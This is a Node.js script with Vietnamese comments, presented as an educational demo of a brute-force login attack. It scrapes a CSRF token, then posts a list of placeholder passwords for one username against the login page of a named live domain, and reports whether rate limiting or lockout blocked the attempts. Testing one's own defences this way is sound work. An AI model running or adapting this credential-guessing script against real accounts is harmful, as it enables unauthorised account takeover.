/**
 * DEMO: Brute Force Attack on Login
 * Tấn công vét cạn mật khẩu - Demonstration for Educational Purpose
 * 
 * Mục đích: Minh họa cách attacker thử nhiều password liên tiếp
 * Phòng chống: Rate limiting + Account lockout
 */

const axios = require('axios');

// Cấu hình
const BASE_URL = 'http://tmd1907.id.vn';
const TARGET_USERNAME = 'testuser2';  // Thử tài khoản khác
const ATTACK_PASSWORDS = [
  'wrongpass1',
  'wrongpass2',
  'wrongpass3',
  'wrongpass4',
  'wrongpass5',
  'wrongpass6',
  'wrongpass7',
  'wrongpass8',
  'wrongpass9',
  'wrongpass10'
];

// Create axios instance with cookie jar
const axiosInstance = axios.create({
  withCredentials: true
});

// Để handle form-urlencoded data
const querystring = require('querystring');

console.log('🔴 DEMO: Brute Force Attack');
console.log('================================');
console.log(`Target URL: ${BASE_URL}`);
console.log(`Target Username: ${TARGET_USERNAME}`);
console.log(`Number of attempts: ${ATTACK_PASSWORDS.length}`);
console.log('================================');
console.log('\n⚠️  NOTE: Trong production, CSRF token có thể không khớp giữa request');
console.log('nếu session không được maintain properly.\n');

/**
 * Hàm thực hiện tấn công brute force
 */
async function bruteForceAttack() {
  let successCount = 0;
  let failureCount = 0;
  let blockedCount = 0;
  let csrfToken = '';
  
  // Bước 1: Lấy CSRF token từ trang login
  console.log('📍 Step 1: Lấy CSRF token từ trang login...\n');
  try {
    const loginPage = await axiosInstance.get(`${BASE_URL}/login`);
    const csrfMatch = loginPage.data.match(/name="_csrf"\s*value="([^"]+)"/);
    if (csrfMatch) {
      csrfToken = csrfMatch[1];
      console.log(`✅ CSRF token lấy được: ${csrfToken.substring(0, 20)}...`);
      console.log(`   Cookies stored: ${Object.keys(axiosInstance.defaults.headers).length > 0 ? 'Yes' : 'No'}\n`);
    } else {
      console.log('⚠️  Không tìm thấy CSRF token trong HTML\n');
      console.log('🔍 Đang dùng token rỗng để test rate limiting...\n');
    }
  } catch (error) {
    console.log(`⚠️  Lỗi khi lấy CSRF token: ${error.message}\n`);
  }
  
  for (let attempt = 1; attempt <= ATTACK_PASSWORDS.length; attempt++) {
    const password = ATTACK_PASSWORDS[attempt - 1];
    
    try {
      console.log(`[Attempt ${attempt}/${ATTACK_PASSWORDS.length}] Trying password: "${password}"...`);
      
      const payload = {
        username: TARGET_USERNAME,
        password: password,
        _csrf: csrfToken || ''  // Có thể rỗng, server sẽ reject CSRF
      };
      
      const response = await axiosInstance.post(`${BASE_URL}/login`, 
        querystring.stringify(payload), 
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true
        }
      );

      if (response.status === 200 || response.status === 302) {
        console.log(`✅ SUCCESS! Password found: "${password}"`);
        console.log(`   Status: ${response.status}`);
        successCount++;
        break; // Tấn công thành công, dừng
      } else if (response.status === 429) {
        console.log(`❌ BLOCKED! Rate limit triggered!`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Message: ${response.data?.message || 'Too many requests'}`);
        blockedCount++;
        break; // Bị rate limit, dừng
      } else if (response.status === 403) {
        console.log(`⚠️  BLOCKED! Forbidden (CSRF)`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Message: ${response.data?.message || response.data?.error || 'Forbidden'}`);
        blockedCount++;
        break; // Bị khóa, dừng
      } else if (response.status === 400 || response.status === 401) {
        console.log(`❌ FAILED! Wrong password`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Message: ${response.data?.error || response.data?.message || 'Invalid credentials'}`);
        failureCount++;
      } else {
        console.log(`⚠️  Status: ${response.status}`);
        if (response.data) {
          console.log(`   Data: ${typeof response.data === 'string' ? response.data.substring(0, 100) : JSON.stringify(response.data).substring(0, 100)}`);
        }
      }
      
      // Delay 1 giây giữa các attempt để không quá nhanh
      await sleep(1000);
      
    } catch (error) {
      console.log(`❌ ERROR: ${error.message}`);
      failureCount++;
    }
    
    console.log('');
  }

  // Kết quả tấn công
  console.log('\n================================');
  console.log('📊 ATTACK SUMMARY');
  console.log('================================');
  console.log(`✅ Success:  ${successCount}`);
  console.log(`❌ Failed:   ${failureCount}`);
  console.log(`🛡️  Blocked:  ${blockedCount}`);
  console.log('================================\n');

  if (successCount > 0) {
    console.log('🔴 ATTACK SUCCESSFUL! Password was cracked!');
  } else if (blockedCount > 0) {
    console.log('🟢 ATTACK BLOCKED! Security measures worked!');
    console.log('   - Rate limiting prevented brute force');
    console.log('   - Account was protected');
  } else {
    console.log('🟡 ATTACK FAILED! All passwords were incorrect.');
  }
}

/**
 * Sleep function
 */
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Main execution
 */
(async () => {
  try {
    await bruteForceAttack();
  } catch (error) {
    console.error('Fatal error:', error.message);
  }
})();
